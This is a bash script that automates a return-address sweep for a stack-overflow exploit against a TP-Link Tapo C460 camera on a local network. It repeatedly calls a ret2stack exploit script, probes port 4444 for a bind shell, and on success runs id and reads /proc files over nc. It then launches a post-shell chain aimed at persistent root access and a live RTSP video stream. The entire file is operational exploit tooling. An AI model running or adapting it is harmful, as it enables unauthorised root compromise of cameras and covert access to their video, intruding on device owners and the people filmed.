#!/bin/bash
# Incremental C460 stack-address sweep — v3: burst-mode (8 shots per wake window),
# state persists across sleep cycles, in-band shell grab, auto-advance.
cd /Users/jemanuel/projects/franken_surveillance_system
STATE=/tmp/c460_sweep_incremental.idx
[ -s "$STATE" ] && IDX=$(cat "$STATE") || IDX=0
BASE=0xbef80000
STEP=0x400
COUNT=256
BURST=8            # shots per wake window
LOG=/tmp/c460_incremental_sweep.log
PY=/opt/homebrew/bin/python3
log() { echo "$(date '+%H:%M:%S') $*" >> "$LOG"; }

ds_up() {
  curl -sk -m 3 --interface en1 -X POST -H "User-Agent: Tapo CameraClient Android" \
    -d '{"method":"login","params":{"cnonce":"","encrypt_type":"3","username":"admin"}}' \
    https://192.168.4.33/ 2>/dev/null | grep -q error_code
}

log "incremental sweep v3 starting from index $IDX (burst=$BURST)"
while [ $IDX -lt $COUNT ]; do
  if ! ds_up; then
    log "camera not fully awake, waiting"
    sleep 30
    continue
  fi
  log "WAKE WINDOW — bursting $BURST shots from index $IDX"
  SHOT=0
  while [ $SHOT -lt $BURST ] && [ $IDX -lt $COUNT ]; do
    # keep checking DS is still up mid-burst
    if ! ds_up; then log "DS dropped mid-burst at shot $SHOT"; break; fi
    ADDR=$(printf "0x%x" $((BASE + IDX * STEP)))
    RESULT=$(FORCE=1 timeout 20 sudo -n $PY deliverables/scripts/tapo_connectap_sc.py ret2stack \
      --host 192.168.4.33 --offset 1060 --sled 0 --padpc 1 --sledfill --pcround 0x1000 \
      --addr $ADDR --count 1 --mac 50:3D:D1:E3:E2:07 2>&1 | grep -E "alive|DEAD|SHELL" | tail -1)
    log "$ADDR $RESULT"
    if echo "$RESULT" | grep -qE "DEAD|hang"; then
      log "HANG/DEAD at $ADDR — address pinned"
      echo "$ADDR" > /tmp/c460_root_addr.txt
    fi
    # in-band shell check + grab (no nc -z)
    if timeout 4 bash -c 'exec 3<>/dev/tcp/192.168.4.33/4444' 2>/dev/null; then
      log "SHELL FOUND at $ADDR — grabbing recon"
      echo "$ADDR" > /tmp/c460_root_addr.txt
      mkdir -p /tmp/pane1/192.168.4.33
      (printf 'id\n'; sleep 2; printf 'cat /proc/mtd\n'; sleep 2; printf 'cat /proc/version\n'; sleep 2) | \
        timeout 12 nc 192.168.4.33 4444 > /tmp/pane1/192.168.4.33/recon_sweep.txt 2>/dev/null
      log "RECON: $(wc -c < /tmp/pane1/192.168.4.33/recon_sweep.txt 2>/dev/null) bytes — head:"
      head -6 /tmp/pane1/192.168.4.33/recon_sweep.txt >> "$LOG"
      # hand off to postshell immediately (repeatable ROP + RTSP)
      log "RUNNING POSTSHELL CHAIN"
      sudo -n bash deliverables/scripts/c460_postshell.sh 192.168.4.33 >> "$LOG" 2>&1 \
        && log "POSTSHELL OK — repeatable root + RTSP live" \
        || log "POSTSHELL failed — shell addr saved in /tmp/c460_root_addr.txt"
      echo $IDX > "$STATE"
      exit 0
    fi
    echo $IDX > "$STATE"
    IDX=$((IDX + 1))
    SHOT=$((SHOT + 1))
  done
done
log "incremental sweep v3 done"
